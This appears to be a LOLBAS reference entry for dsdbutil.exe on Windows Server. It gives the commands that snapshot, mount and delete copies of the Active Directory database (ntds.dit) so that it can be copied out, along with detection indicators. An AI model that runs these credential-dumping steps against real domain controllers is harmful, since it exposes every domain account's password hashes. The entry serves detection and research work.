---
title: "dsdbutil.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dsdbutil/
fetched_at: 2026-09-20T17:14:41Z
license: unspecified
category: windows
---

Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.

## Paths
- C:\Windows\System32\dsdbutil.exe
- C:\Windows\SysWOW64\dsdbutil.exe

## Resources
- [https://gist.github.com/bohops/88561ca40998e83deb3d1da90289e358](https://gist.github.com/bohops/88561ca40998e83deb3d1da90289e358)
- [https://www.netwrix.com/ntds_dit_security_active_directory.html](https://www.netwrix.com/ntds_dit_security_active_directory.html)

## Acknowledgements
- bohop ([@bohops](https://twitter.com/@bohops))
- Ekitji ([@eki_erk](https://twitter.com/@eki_erk))

## Detections
- IOC: Event ID 4688
- IOC: dsdbutil.exe process creation
- IOC: Event ID 4663
- IOC: Regular and Volume Shadow Copy attempts to read or modify ntds.dit
- IOC: Event ID 4656
- IOC: Regular and Volume Shadow Copy attempts to read or modify ntds.dit

## Dump

1. dsdbutil supports VSS snapshot creation

```
dsdbutil.exe "activate instance ntds" "snapshot" "create" "quit" "quit"
```

   - Use case: Snapshoting of Active Directory NTDS.dit database

   - Privileges required: Administrator

   - Operating systems: Windows Server 2012, Windows Server 2016, Windows Server 2019

   - ATT&CK® technique: T1003.003

2. Mounting the snapshot with its GUID

```
dsdbutil.exe "activate instance ntds" "snapshot" "mount {GUID}" "quit" "quit"
```

   - Use case: Mounting the snapshot to access the ntds.dit with copy c:\<Snap Volume>\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit.bak

   - Privileges required: Administrator

   - Operating systems: Windows Server 2012, Windows Server 2016, Windows Server 2019

   - ATT&CK® technique: T1003.003

3. Deletes the mount of the snapshot

```
dsdbutil.exe "activate instance ntds" "snapshot" "delete {GUID}" "quit" "quit"
```

   - Use case: Deletes the snapshot

   - Privileges required: Administrator

   - Operating systems: Windows Server 2012, Windows Server 2016, Windows Server 2019

   - ATT&CK® technique: T1003.003

4. Mounting with snapshot identifier

```
dsdbutil.exe "activate instance ntds" "snapshot" "create" "list all" "mount 1" "quit" "quit"
```

   - Use case: Mounting the snapshot identifier 1 and accessing it with copy c:\<Snap Volume>\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit.bak

   - Privileges required: Administrator

   - Operating systems: Windows Server 2012, Windows Server 2016, Windows Server 2019

   - ATT&CK® technique: T1003.003

5. Deletes the mount of the snapshot

```
dsdbutil.exe "activate instance ntds" "snapshot" "list all" "delete 1" "quit" "quit"
```

   - Use case: deletes the snapshot

   - Privileges required: Administrator

   - Operating systems: Windows Server 2012, Windows Server 2016, Windows Server 2019

   - ATT&CK® technique: T1003.003
